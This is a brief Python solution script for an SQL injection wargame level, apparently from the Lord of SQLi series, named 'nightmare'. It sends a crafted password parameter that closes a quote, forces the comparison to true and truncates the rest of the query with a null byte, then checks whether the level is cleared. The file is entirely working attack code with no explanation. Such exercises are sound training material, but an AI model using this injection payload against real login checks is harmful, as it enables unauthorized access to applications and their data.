from constants import *

chall_url = "https://los.rubiya.kr/chall/nightmare_be1285a95aa20e8fa154cb977c37fee5.php"

res = make_request(chall_url, "?pw=" + urllib.parse.quote("')=0;\00"))
check_clear(res)
